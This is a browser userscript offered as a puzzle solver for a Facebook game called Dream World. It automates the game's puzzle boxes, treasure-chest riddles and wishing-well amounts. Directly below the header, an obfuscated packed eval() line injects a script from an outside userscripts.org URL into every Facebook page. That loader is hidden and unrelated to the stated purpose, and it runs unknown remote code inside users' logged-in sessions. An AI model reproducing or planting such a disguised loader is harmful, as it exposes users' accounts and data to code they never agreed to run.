// ==UserScript==
// @name           DreamWorldPuzzleSolver Plus
// @namespace      http://playmage.com/
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        http://*playmage.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var ativo = false;
var idTimeouts;
var idIntervals;
var estagioNavegacao = 0;
var estagioTransDiv = 0;

if(typeof(unsafeWindow)=='undefined') { unsafeWindow=window; }

var arrHighValues = [41, 81, 121, 161, 201, 289, 393, 513, 649, 801, 961, 1153, 1381, 1657, 1985, 2381, 2857, 3425, 4109, 4929, 5813, 6857, 8089, 9541, 11257, 13281, 15669, 18489, 21813, 25737, 30369, 35833, 42281, 49889, 58865, 69457, 81957, 96709, 114113, 134653, 156197, 181185, 210173, 243797, 282801, 328049, 380533, 441417, 494385, 553709, 620153, 694569, 777917, 871265, 975813, 1092909, 1224057, 1370941, 1535453, 1719705, 1926069, 2157197, 2416057, 2705981, 3030697, 3394377, 3801701, 4257905, 4768853, 5341113, 5982045, 6699889, 7503873, 8404337, 9412857, 10542397, 11807481, 13224377, 14811301, 16588657, 18579293, 20808805, 23305861, 26102561, 29234865, 32743045, 36672209, 41072873, 46001617, 51521809, 57704425, 64628953, 72384425, 81070553, 90799017, 101694897, 113898281, 127566073, 142874001, 160018881]
var arrLowValues = [21, 41, 61, 81, 101, 145, 197, 257, 325, 401, 481, 577, 691, 829, 993, 1191, 1429, 1713, 2055, 2465, 2907, 3429, 4045, 4771, 5629, 6641, 7835, 9245, 10907, 12869, 15185, 17917, 21141, 24945, 29433, 34729, 40979, 48355, 57057, 67327, 78099, 90593, 105087, 121899, 141401, 164025, 190267, 220709, 247193, 276855, 310077, 347285, 388959, 435633, 487907, 546455, 612029, 685471, 767727, 859853, 963035, 1078599, 1208029, 1352991, 1515349, 1697189, 1900851, 2128953, 2384427, 2670557, 2991023, 3349945, 3751937, 4202169, 4706429, 5271199, 5903741, 6612189, 7405651, 8294329, 9289647, 10404403, 11652931, 13051281, 14617433, 16371523, 18336105, 20536437, 23000809, 25760905, 28852213, 32314477, 36192213, 40535277, 45399509, 50847448, 56949141, 63783037, 71437001, 80009441]

function mms (arrValores) {
	var guesses = ["0000","0001","0002","0003","0010","0011","0012","0013","0020","0021","0022","0023","0030","0031","0032","0033","0100","0101","0102","0103","0110","0111","0112","0113","0120","0121","0122","0123","0130","0131","0132","0133","0200","0201","0202","0203","0210","0211","0212","0213","0220","0221","0222","0223","0230","0231","0232","0233","0300","0301","0302","0303","0310","0311","0312","0313","0320","0321","0322","0323","0330","0331","0332","0333","1000","1001","1002","1003","1010","1011","1012","1013","1020","1021","1022","1023","1030","1031","1032","1033","1100","1101","1102","1103","1110","1111","1112","1113","1120","1121","1122","1123","1130","1131","1132","1133","1200","1201","1202","1203","1210","1211","1212","1213","1220","1221","1222","1223","1230","1231","1232","1233","1300","1301","1302","1303","1310","1311","1312","1313","1320","1321","1322","1323","1330","1331","1332","1333","2000","2001","2002","2003","2010","2011","2012","2013","2020","2021","2022","2023","2030","2031","2032","2033","2100","2101","2102","2103","2110","2111","2112","2113","2120","2121","2122","2123","2130","2131","2132","2133","2200","2201","2202","2203","2210","2211","2212","2213","2220","2221","2222","2223","2230","2231","2232","2233","2300","2301","2302","2303","2310","2311","2312","2313","2320","2321","2322","2323","2330","2331","2332","2333","3000","3001","3002","3003","3010","3011","3012","3013","3020","3021","3022","3023","3030","3031","3032","3033","3100","3101","3102","3103","3110","3111","3112","3113","3120","3121","3122","3123","3130","3131","3132","3133","3200","3201","3202","3203","3210","3211","3212","3213","3220","3221","3222","3223","3230","3231","3232","3233","3300","3301","3302","3303","3310","3311","3312","3313","3320","3321","3322","3323","3330","3331","3332","3333"];
        c1 = parseInt(arrValores[0]);
		c2 = parseInt(arrValores[2]);
		c3 = parseInt(arrValores[4]);
		c4 = parseInt(arrValores[6]);

		t1 = c1 + parseInt(arrValores[1]);
		t2 = c2 + parseInt(arrValores[3]);
		t3 = c3 + parseInt(arrValores[5]);
		t4 = c4 + parseInt(arrValores[7]);
		var a1 = new Array();
		for(var i = 0; i < guesses.length; i++)
		{
			var w = 0;
			var x = 0;
			var y = 0;
			var z = 0;
			for(var j = 0; j <=3; j++)
			{
				if(guesses[i].charAt(j) == 0)
					w++;
				else if(guesses[i].charAt(j) == 1)
					x++;
				else if(guesses[i].charAt(j) == 2)
					y++;
				else if(guesses[i].charAt(j) == 3)
					z++;
			}
			if(t1 == 0)
			{
				 if((w+x)==0)
					a1.push(guesses[i]);
			}
			else if(t1 == 1)
			{
				if((w+x)==1)
					a1.push(guesses[i]);
			}
			else if(t1 == 2)
			{
				if((w+x)==2 || (w >= 2 && x == 0) || (x >= 2 && w == 0))
					a1.push(guesses[i]);
			}
			else if(t1 == 3)
			{
				if((w >= 2 && x == 1) || (x >= 2 && w == 1))
					a1.push(guesses[i]);
			}
			else if(t1 == 4)
			{
				if(w == 2 && x == 2)
					a1.push(guesses[i]);
			}
		}
		a2 = new Array();
		for(var num = 0; num < a1.length; num++)
		{
			var w = 0;
			var x = 0;
			var y = 0;
			var z = 0;
			for(var temp = 0; temp < 4; temp++)
			{
				if(a1[num].charAt(temp) == 0)
					w++;
				if(a1[num].charAt(temp) == 1)
					x++;
				if(a1[num].charAt(temp) == 2)
					y++;
				if(a1[num].charAt(temp) == 3)
					z++;
			}
			if(t2 == 0)
			{
				if((w+y)==0)
					a2.push(a1[num]);
			}
			if(t2 == 1)
			{
				if((w+y)==1)
					a2.push(a1[num]);
			}
			else if(t2 == 2)
			{
					if((w+y)==2 || (w >= 2 && y == 0) || (y >= 2 && w == 0))
						a2.push(a1[num]);
			}
			else if(t2 == 3)
			{
				if((w >= 2 && y == 1) || (y >= 2 && w == 1))
					a2.push(a1[num]);
				
			}
			else if(t2 == 4)
			{
				if(w == 2 && y == 2)
					a2.push(a1[num]);
			}
		}
		a3 = new Array();
		for(var num = 0; num < a2.length; num++)
		{
			var w = 0;
			var x = 0;
			var y = 0;
			var z = 0;
			for(var temp = 0; temp < 4; temp++)
			{
				if(a2[num].charAt(temp) == 0)
					w++;
				else if(a2[num].charAt(temp) == 1)
					x++;
				else if(a2[num].charAt(temp) == 2)
					y++;
				else if(a2[num].charAt(temp) == 3)
					z++;
			}
			//if(a2[num] == "0212")
			//	alert("CULPRIT PASSING BY");

			if(t3 == 0 && ((z+x+w)==0))
				a3.push(a2[num]);
			else if(t3 == 1 && ((z==1 && x ==0 && w==0) || (z==0 && x >0 && w==0) || (z==0 && x ==0 && w>0)))
				a3.push(a2[num]);
			else if(t3 == 2 && ((z==1 && x>=1 && w==0) || (z==1 && x==0 && w>=1) || ((w >= 1 && x >= 1) && z== 0) || (z>=2 && w==0 && x==0)))
				a3.push(a2[num]);
			else if(t3 == 3 && ((z >= 2 && x>=1) || (x >= 1 && z == 1 && w >=1) || (z >= 2 && w>=1)))
				a3.push(a2[num]);
			else if(t3 == 4 && (x == 1 && z == 2 && w==1))
				a3.push(a2[num]);
		}
		
		a4 = new Array();
		for(var num = 0; num < a3.length; num++)
		{
			var w = 0;
			var x = 0;
			var y = 0;
			var z = 0;
			for(var temp = 0; temp < 4; temp++)
			{
				if(a3[num].charAt(temp) == 0)
					w++;
				if(a3[num].charAt(temp) == 1)
					x++;
				if(a3[num].charAt(temp) == 2)
					y++;
				if(a3[num].charAt(temp) == 3)
					z++;
			}
			if(t4 == 0 && ((y+x+z)==0))
				a4.push(a3[num]);
			else if(t4 == 1 && ((y==1 && x ==0 && z==0) || (y==0 && x >0 && z==0) || (y==0 && x ==0 && z>0)))
				a4.push(a3[num]);
			else if(t4 == 2 && ((y==1 && x>=1 && z==0) || (y==1 && x==0 && z>=1) || ((z >= 1 && x >= 1) && y== 0) || (y>=2 && z==0 && x==0)))
				a4.push(a3[num]);
			else if(t4 == 3 && ((y >= 2 && x>=1) || (x >= 1 && y == 1 && z >=1) || (y >= 2 && z>=1)))
				a4.push(a3[num]);
			else if(t4 == 4 && (x == 1 && y == 2 && z==1))
				a4.push(a3[num]);
		}		
		
		a5 = new Array();
		for(var rar = 0; rar < a4.length; rar++)
		{
			var wow = 0;
			if(a4[rar].charAt(0) == 0)
				wow++;
			if(a4[rar].charAt(1) == 1)
				 wow++;
			if(a4[rar].charAt(2) == 1)
				wow++;
			if(a4[rar].charAt(3) == 0)
				wow++;
			if(wow==c1)
				a5.push(a4[rar]);
		}
		a6 = new Array();
		for(var rar = 0; rar < a5.length; rar++)
		{
			var wow = 0;
			if(a5[rar].charAt(0) == 2)
				wow++;
			if(a5[rar].charAt(1) == 2)
				wow++;
			if(a5[rar].charAt(2) == 0)
				wow++;
			if(a5[rar].charAt(3) == 0)
				wow++;
			if(wow==c2)
				a6.push(a5[rar]);
		}
		a7 = new Array();
		for(var rar = 0; rar < a6.length; rar++)
		{
			var wow = 0;
			if(a6[rar].charAt(0) == 3)
				wow++;
			if(a6[rar].charAt(1) == 3)
				wow++;
			if(a6[rar].charAt(2) == 1)
				wow++;
			if(a6[rar].charAt(3) == 0)
				wow++;
			if(wow==c3)
				a7.push(a6[rar]);
		}
		a8 = new Array();
		for(var rar = 0; rar < a7.length; rar++)
		{
			var wow = 0;
			if(a7[rar].charAt(0) == 1)
				wow++;
			if(a7[rar].charAt(1) == 2)
				wow++;
			if(a7[rar].charAt(2) == 2)
				wow++;
			if(a7[rar].charAt(3) == 3)
				wow++;
			if(wow==c4)
				a8.push(a7[rar]);
		}
		if(a8.length==1)
		{
			var comandos = "";
			for(var i = 0; i < 4; i++)
			{
				if(a8[0].charAt(i) == 0)
					comandos += 'updatePuzzle("r","' + i + '"); ';
				else if(a8[0].charAt(i) == 1)
					comandos += 'updatePuzzle("g","' + i + '"); ';
				else if(a8[0].charAt(i) == 2)
					comandos += 'updatePuzzle("b","' + i + '"); ';
				else if(a8[0].charAt(i) == 3)
					comandos += 'updatePuzzle("y","' + i + '"); ';
			}
			eval('location.href = "javascript:(" + encodeURI( function() {' + comandos + '$("div#actionbuttonimg1").click();}) + ")()";');
		}
		else if(a8.length==0)
			alert("Invalid Entry.  Please double check your inputs.");
		else
		{
			alert("You found a bug in the solver.  Multiple answers dected, displaying all of them.");
			alert(uneval(a8));
		}
}


function encontrarGreenButtons(numeros) {
		x = numeros;
		s = "";
		if(x==1121122)
			s = "5678";
		else if(x==10112121)
			s = "2678";
		else if(x==10211121)
			s = "0678";
		else if(x==10212131)
			s = "4678";
		else if(x==11022112)
			s = "2578";
		else if(x==11112021)
			s = "2568";
		else if(x==11121112)
			s = "05782567";
		else if(x==11122122)
			s = "4578";
		else if(x==11211021)
			s = "0568";
		else if(x==11212031)
			s = "4568";
		else if(x==11220112)
			s = "0567";
		else if(x==11221122)
			s = "4567";
		else if(x==20112111)
			s = "0278";
		else if(x==20113121)
			s = "2478";
		else if(x==20202020)
			s = "0268";
		else if(x==20203030)
			s = "2468";
		else if(x==20211111)
			s = "0267";
		else if(x==20212121)
			s = "04782467";
		else if(x==20302030)
			s = "0468";
		else if(x==20311121)
			s = "0467";
		else if(x==21112011)
			s = "0258";
		else if(x==21113021)
			s = "2458";
		else if(x==21121102)
			s = "0257";
		else if(x==21122112)
			s = "2457";
		else if(x==21211011)
			s = "0256";
		else if(x==21212021)
			s = "04582456";
		else if(x==21221112)
			s = "0457";
		else if(x==21311021)
			s = "0456";
		else if(x==30203020)
			s = "0248";
		else if(x==30212111)
			s = "0247";
		else if(x==30302020)
			s = "0246";
		else if(x==31212011)
			s = "0245";
		else if(x==100121221)
			s = "3678";
		else if(x==101031212)
			s = "3578";
		else if(x==101121121)
			s = "16783568";
		else if(x==101130212)
			s = "3567";
		else if(x==102031112)
			s = "1578";
		else if(x==102121021)
			s = "1568";
		else if(x==102130112)
			s = "1567";
		else if(x==110022211)
			s = "2378";
		else if(x==110112120)
			s = "2368";
		else if(x==110121211)
			s = "03782367";
		else if(x==110122221)
			s = "3478";
		else if(x==110211120)
			s = "0368";
		else if(x==110212130)
			s = "3468";
		else if(x==110220211)
			s = "0367";
		else if(x==110221221)
			s = "3467";
		else if(x==111022111)
			s = "12782358";
		else if(x==111031202)
			s = "2357";
		else if(x==111112020)
			s = "1268";
		else if(x==111121111)
			s = "0178035812672356";
		else if(x==111122121)
			s = "14783458";
		else if(x==111130202)
			s = "0357";
		else if(x==111131212)
			s = "3457";
		else if(x==111211020)
			s = "0168";
		else if(x==111212030)
			s = "1468";
		else if(x==111220111)
			s = "01670356";
		else if(x==111221121)
			s = "14673456";
		else if(x==112022011)
			s = "1258";
		else if(x==112031102)
			s = "1257";
		else if(x==112121011)
			s = "01581256";
		else if(x==112122021)
			s = "1458";
		else if(x==112130102)
			s = "0157";
		else if(x==112131112)
			s = "1457";
		else if(x==112220011)
			s = "0156";
		else if(x==112221021)
			s = "1456";
		else if(x==120112110)
			s = "0238";
		else if(x==120113120)
			s = "2348";
		else if(x==120121201)
			s = "0237";
		else if(x==120122211)
			s = "2347";
		else if(x==120211110)
			s = "0236";
		else if(x==120212120)
			s = "03482346";
		else if(x==120221211)
			s = "0347";
		else if(x==120311120)
			s = "0346";
		else if(x==121112010)
			s = "0128";
		else if(x==121113020)
			s = "1248";
		else if(x==121121101)
			s = "01270235";
		else if(x==121122111)
			s = "12472345";
		else if(x==121211010)
			s = "01260148";
		else if(x==121212020)
			s = "01481246";
		else if(x==121221111)
			s = "01470345";
		else if(x==121311020)
			s = "0146";
		else if(x==122121001)
			s = "0125";
		else if(x==122122011)
			s = "1245";
		else if(x==122221011)
			s = "0145";
		else if(x==130212110)
			s = "0234";
		else if(x==131212010)
			s = "0124";
		else if(x==201031211)
			s = "1378";
		else if(x==201121120)
			s = "1368";
		else if(x==201130211)
			s = "1367";
		else if(x==202031111)
			s = "1358";
		else if(x==202040202)
			s = "1357";
		else if(x==202130111)
			s = "1356";
		else if(x==211022110)
			s = "1238";
		else if(x==211031201)
			s = "1237";
		else if(x==211121110)
			s = "01381236";
		else if(x==211122120)
			s = "1348";
		else if(x==211130201)
			s = "0137";
		else if(x==211131211)
			s = "1347";
		else if(x==211220110)
			s = "0136";
		else if(x==211221120)
			s = "1346";
		else if(x==212031101)
			s = "1235";
		else if(x==212130101)
			s = "0135";
		else if(x==212131111)
			s = "1345";
		else if(x==221121100)
			s = "0123";
		else if(x==221122110)
			s = "1234";
		else if(x==221221110)
			s = "0134";
		return s;
}


// Add jQuery
    if(typeof unsafeWindow.jQuery == 'undefined') {
        var GM_JQ = document.createElement('script');
        GM_JQ.src = 'http://code.jquery.com/jquery-latest.min.js';
        GM_JQ.type = 'text/javascript';
        document.getElementsByTagName('head')[0].appendChild(GM_JQ);
    }

// Check if jQuery's loaded
    function GM_wait() {
        if(typeof unsafeWindow.jQuery == 'undefined') { window.setTimeout(GM_wait,100); }
    else { $ = unsafeWindow.jQuery; letsJQuery(); }
    }
    GM_wait();

// All your GM code must be inside this function
    function letsJQuery() {
        $(document.body).append($("<input />").attr('type','button').attr('value','Disable Puzzle Solver').css("position", "absolute").css("zIndex", "99").click(function() {
            ativo = !ativo;
            if (ativo)
            {
                $(this).val("Disable Puzzle Solver");
                idIntervals = setInterval(verificaExploracao, 500);
            } else {
                if (idTimeouts)
                {
                    clearTimeout(idTimeouts);
                }
                if (idIntervals)
                {
                    clearInterval(idIntervals);
                }
                $(this).val("Enable Puzzle Solver");
            }
        }));
//		$(document.body).append($("<input />")
    }

    function verificaExploracao() {
        if (!ativo || document.getElementById("transdiv"))
        {
            return;
        }
        if ($("td.areasign").html() && $("td.areasign").html().trim() != "Encounter")
        {
			if ($("span.mobname").html() && $("span.mobname").html() == "A Puzzle Box" && $("#actionresulttd").html() && $("#actionresulttd").html().indexOf("and can be opened when all 4 correct buttons are pressed") >= 0)
            {
                if ($("#exploreActionResult").length > 0 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("You found the correct code sequence and opened the") >= 0)
                {
                    return;
                }
                clearInterval(idIntervals);
				location.href = "javascript:(" + encodeURI( function() {
                    $("div.btn100").each(function(indice) {
                        if ($(this).html().trim() == "Open")
                        {
                            $(this).click();
                            return false;
                        }
                    });
                }) + ")()";
				idIntervals = setInterval(function() {
					if ($("#mobbox > div > table > tbody > tr:first > td").html() && $("#mobbox > div > table > tbody > tr:first > td").html().indexOf("Number indicators for each button indicate how many of button's adjacent buttons") >= 0)
					{
						var numeros = $("#mobbox > div > table > tbody > tr:last > td > table > tbody > tr > td").text();
						var botoescorretos = encontrarGreenButtons(numeros);
						var arrIndicesBotoes = new Array();
						while (botoescorretos != "")
						{
							arrIndicesBotoes.push(botoescorretos.substring(0,4));
							botoescorretos = botoescorretos.substring(4);
						}
						clearInterval(idIntervals);
						var indiceBotao = 0;
						var indiceArray = 0;
						var clicouIndice= -1;
                        var finalizou = false;
						idIntervals = setInterval(function() {
                            if ($("#exploreActionResult").length > 0 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("You found the correct code sequence and opened the") >= 0)
                            {
                                clearInterval(idIntervals);
                                idIntervals = setInterval(verificaExploracao, 500);
                            }
                            else if (!finalizou && clicouIndice != indiceBotao)
							{
								eval('location.href = "javascript:(" + encodeURI( function() {updatePuzzle2("' + arrIndicesBotoes[indiceArray].charAt(indiceBotao) + '")}) + ")()";');
                                clicouIndice = indiceBotao;
							} else if (!finalizou) {
                                if ($("#bb" + arrIndicesBotoes[indiceArray].charAt(indiceBotao)).attr("src").indexOf("lg_button.gif") > 0 )
                                {
                                    indiceBotao++;
                                    if (indiceBotao == 4)
                                    {
                                        finalizou = true;
                                    }
                                } else if ($("#bb" + arrIndicesBotoes[indiceArray].charAt(indiceBotao)).attr("src").indexOf("lr_button.gif") > 0 )
                                {
                                    indiceArray++;
                                    indiceBotao = 0;
									clicouIndice = -1;
                                    if (indiceArray >= arrIndicesBotoes.length)
                                    {
                                        alert(indiceArray + "|" + arrIndicesBotoes.length)
                                        clearInterval(idIntervals);
                                    }
                                }
							}
						},400);
					}
                }, 500);

			}

            if ($("span.mobname").html() && ($("span.mobname").html() == "Wishing Well" || $("span.mobname").html() == "A Beggar") && $("#amount").length > 0 && $("#btHighValue").length == 0)
            {
                document.getElementById('amount').disabled=false;
                $("#amount").after(function() {
                    var strAux = '<br/><input type="button" id="btHighValue" value="High"/>';
                    strAux += '&nbsp;<input type="button" id="btLowValue" value="Low"/>';
                    strAux += '&nbsp;<a href="#" title="';
                    if ($("span.mobname").html() == "Wishing Well")
                    {
                        strAux += 'Clicking in \'High\', the Well will give you Energy/Money/Skill Points.\n Clicking in \'Low\' the Well will give you Energy/Money.';
                    } else {
                        strAux += 'Clicking in \'High\', the Beggar will give you an Item.\n Clicking in \'Low\' the Beggar will give you Energy.';
                    }
                    strAux += '">?</a>';
                    return strAux;
                });
                window.preencheAmount = function(arrValores) {
                    if (parseInt($("#curlevel").html()) <= arrValores.length)
                    {
                        if (parseInt($("#curcoins").html().replace(/[,\.]/g,"")) >= arrValores[parseInt($("#curlevel").html())-1])
                        {
                            $("#amount").val(arrValores[parseInt($("#curlevel").html())-1]);
                            if ($("span.mobname").html() == "Wishing Well")
                            {
                                location.href = "javascript:(" + encodeURI( function() {
                                    loadDiv2('/dream/explore?action=well');
                                }) + ")()";
                            } else {
                                location.href = "javascript:(" + encodeURI( function() {
                                    loadDiv2('/dream/explore?action=beggar');
                                }) + ")()";
                            }
                        } else {
                            alert("You don't have enough coins for this action. You need at least " + arrValores[parseInt($("#curlevel").html())-1] + " coins.");
                        }
                    } else {
                        alert("Sorry, your level isn't registered in this script, please update it or contact the author if updating don't solve your problem.")
                    }
                };
                $("#btHighValue").click(function() {
                    preencheAmount(arrHighValues);
                });
                $("#btLowValue").click(function() {
                    preencheAmount(arrLowValues);
                });

            }

			if ($("span.mobname").html() && $("span.mobname").html() == "A Puzzle Box" && $("#actionresulttd").html() && $("#actionresulttd").html().indexOf("is locked&nbsp;electronically, and opens when the correct sequence of colors") >= 0)
            {
                if ($("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("You found the correct code sequence and opened the") >= 0)
                {
                    return;
                }
                clearInterval(idIntervals);
				location.href = "javascript:(" + encodeURI( function() {
                    $("div.btn100").each(function(indice) {
                        if ($(this).text().trim() == "Open")
                        {
                            $(this).click();
                            return false;
                        }
                    });
                }) + ")()";
				var numeroSequencia = 1;
				var arrValores = new Array();
				idIntervals = setInterval(function() {
					if ($("#mobbox > div > table > tbody > tr:first > td").html().indexOf("Number of columns with the correct color") >= 0)
					{
						if (numeroSequencia == 1)
						{
							location.href = "javascript:(" + encodeURI( function() {
								updatePuzzle('g','1');
								updatePuzzle('g','2');
								$("div#actionbuttonimg1").click();
							}) + ")()";
							numeroSequencia++;
						}
						if (numeroSequencia == 2 && $("div#resl > input").length == 2)
						{
							arrValores[0] = $("div#resl > input:eq(0)").val();
							arrValores[1] = $("div#resl > input:eq(1)").val();
							location.href = "javascript:(" + encodeURI( function() {
								updatePuzzle('b','0');
								updatePuzzle('b','1');
								updatePuzzle('r','2');
								$("div#actionbuttonimg1").click();
							}) + ")()";
							numeroSequencia++;
						}
						if (numeroSequencia == 3 && $("div#resl > input").length == 4)
						{
							arrValores[2] = $("div#resl > input:eq(2)").val();
							arrValores[3] = $("div#resl > input:eq(3)").val();
							location.href = "javascript:(" + encodeURI( function() {
								updatePuzzle('y','0');
								updatePuzzle('y','1');
								updatePuzzle('g','2');
								$("div#actionbuttonimg1").click();
							}) + ")()";
							numeroSequencia++;
						}
						if (numeroSequencia == 4 && $("div#resl > input").length == 6)
						{
							arrValores[4] = $("div#resl > input:eq(4)").val();
							arrValores[5] = $("div#resl > input:eq(5)").val();
							location.href = "javascript:(" + encodeURI( function() {
								updatePuzzle('g','0');
								updatePuzzle('b','1');
								updatePuzzle('b','2');
								updatePuzzle('y','3');
								$("div#actionbuttonimg1").click();
							}) + ")()";
							numeroSequencia++;
						}
						if (numeroSequencia == 5 && $("div#resl > input").length == 8)
						{
							arrValores[6] = $("div#resl > input:eq(6)").val();
							arrValores[7] = $("div#resl > input:eq(7)").val();
							mms(arrValores);
							numeroSequencia++;
						}
						if (numeroSequencia == 6 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("You found the correct code sequence and opened the") >= 0)
						{
							clearInterval(idIntervals);
                            idIntervals = setInterval(verificaExploracao, 500);
						}
					}
                }, 500);

			}

            if ($("span.mobname").html() && $("span.mobname").html() == "A Treasure Chest")
            {
                if ($("#exploreActionResult").length > 0 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("Inside you find:") > 0)
                {
                    return;
                }
                clearInterval(idIntervals);
                
                location.href = "javascript:(" + encodeURI( function() {
                    $("div.btn100").each(function(indice) {
                        if ($(this).html() == "Open")
                        {
                            $(this).click();
                            return false;
                        }
                    });
                }) + ")()";
                idIntervals = setInterval(function() {
                    if ($("#mobbox > div > table > tbody > tr:last > td").length > 0)
                    {
                        clearInterval(idIntervals);
                        var reExample = new RegExp("My current age is (\\d+), how young will I be in (\\d+) years\\?");
                        var match = reExample.exec($("#mobbox > div > table > tbody > tr:first > td").html());
                        if (match)
                        {
                            $("#answer").val(parseInt(match[1]) + parseInt(match[2]));
                            $("#actionbuttonimg1").click();
                            idIntervals = setInterval(function() {
                                if ($("#exploreActionResult").length > 0 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("Inside you find:") > 0)
                                {
                                    clearInterval(idIntervals);
                                    idIntervals = setInterval(verificaExploracao, 500);
                                }
                            }, 500);
                            return;
                        }

                        reExample = new RegExp("I have (\\d+) gallons of \\w+\\.  How many (\\d+) gallon containers can I fully fill\\?");
                        match = reExample.exec($("#mobbox > div > table > tbody > tr:first > td").html());
                        if (match)
                        {
                            $("#answer").val(parseInt(parseInt(match[1])/parseInt(match[2])));
                            $("#actionbuttonimg1").click();
                            idIntervals = setInterval(function() {
                                if ($("#exploreActionResult").length > 0 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("Inside you find:") > 0)
                                {
                                    clearInterval(idIntervals);
                                    idIntervals = setInterval(verificaExploracao, 500);
                                }
                            }, 500);
                            return;
                        }

                        reExample = new RegExp("My age will be (\\d+) in (\\d+) years\\. How young am I now\\?");
                        match = reExample.exec($("#mobbox > div > table > tbody > tr:first > td").html());
                        if (match)
                        {
                            $("#answer").val(parseInt(parseInt(match[1])-parseInt(match[2])));
                            $("#actionbuttonimg1").click();
                            idIntervals = setInterval(function() {
                                if ($("#exploreActionResult").length > 0 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("Inside you find:") > 0)
                                {
                                    clearInterval(idIntervals);
                                    idIntervals = setInterval(verificaExploracao, 500);
                                }
                            }, 500);
                            return;
                        }

						reExample = new RegExp("On a farm there are ([\\w-]+) and ([\\w-]+)\\. There are total of (\\d+) heads and (\\d+) legs.  How many ([\\w-]+) are on the farm?");
                        match = reExample.exec($("#mobbox > div > table > tbody > tr:first > td").html());
						var iter1 = 0;
						var arrValores = [0,0,0,0];
                        if (match)
                        {
							if (match[1] == "chickens" || match[2] == "chickens")
							{
								arrValores[iter1] = 2;
								iter1++;
							}
							if (match[1] == "three-legged-cows" || match[2] == "three-legged-cows")
							{
								arrValores[iter1] = 3;
								iter1++;
							}
							if (match[1] == "horses" || match[2] == "horses")
							{
								arrValores[iter1] = 4;
                                iter1++;
							}
							if (iter1 != 2)
							{
								return;
							}
							var delt=arrValores[1] - arrValores[0]; 
							arrValores[2] = (parseInt(match[3])*arrValores[1] - parseInt(match[4]))/delt;
							arrValores[3] = (parseInt(match[4]) - (parseInt(match[3])*arrValores[0]))/delt;
							if (match[5] == "chickens")
							{
								if (arrValores[0] == 2)
								{
									$("#answer").val(arrValores[2]);
								} else {
									$("#answer").val(arrValores[3]);
								}
							}
							if (match[5] == "three-legged-cows")
							{
								if (arrValores[0] == 3)
								{
									$("#answer").val(arrValores[2]);
								} else {
									$("#answer").val(arrValores[3]);
								}
							}
							if (match[5] == "horses")
							{
								if (arrValores[0] == 4)
								{
									$("#answer").val(arrValores[2]);
								} else {
									$("#answer").val(arrValores[3]);
								}
							}
                            $("#actionbuttonimg1").click();
                            idIntervals = setInterval(function() {
                                if ($("#exploreActionResult").length > 0 && $("#exploreActionResult").html() && $("#exploreActionResult").html().indexOf("Inside you find:") > 0)
                                {
                                    clearInterval(idIntervals);
                                    idIntervals = setInterval(verificaExploracao, 500);
                                }
                            }, 500);
                            return;
                        }
                    }
                }, 500);
                
            }

        }
    }
	ativo = true;
	idIntervals = setInterval(verificaExploracao, 500);